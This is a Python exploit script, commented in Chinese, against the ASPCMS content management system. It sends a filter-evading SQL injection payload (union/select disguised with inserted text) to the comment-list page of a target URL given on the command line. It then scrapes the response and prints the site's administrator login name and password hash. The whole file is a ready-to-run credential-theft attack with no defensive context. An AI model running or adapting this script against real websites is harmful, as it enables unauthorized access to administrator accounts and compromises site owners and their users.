from bs4 import BeautifulSoup as bs
import requests
import hashlib
from urllib.parse import urljoin
import re
import sys, getopt

def ASPCMS_EXP(argv):
    #获取输入的URL
    try:
        opts, args = getopt.getopt(argv,"hu:",["url="])
    except getopt.GetoptError:
        print('aspcms.py -u <url>')
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
           print('aspcms.py -u <url>')
           sys.exit()
        elif opt in ("-u", "--url"):
           url = arg
           #print(url)
    i2=urljoin(url.strip(),"/plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20{prefix}user")
    #print(i2)
    try:  # 加入异常处理，忽略程序的报错
        r = requests.get(i2, timeout=4)  # 请求网址并进行超时判断
        #print(r.status_code)
        if r.status_code==200:#判断网址是否可以正常打开
            soup=bs(r.text,"lxml")   #用bs解析网站
            if hashlib.md5:   #判断返回内容中是否有MD5，有的话继续执行
                mb1=soup.find_all(name="div",attrs={"class":"line1"})[0].text #获取line1数据
                mb2=soup.find_all(name="div",attrs={"class":"line2"})[0].text #获取line2数据
                m1 = str(re.findall(".*者(.*)IP.*",mb1))
                m1=str(re.findall('[a-zA-Z]+',m1))
                print(url.strip()+"网站后台的登录名以及密码是：")
                print(m1,mb2)
            else:
                print("不存在漏洞")
    except:
        pass


if __name__=='__main__':
    ASPCMS_EXP(sys.argv[1:])

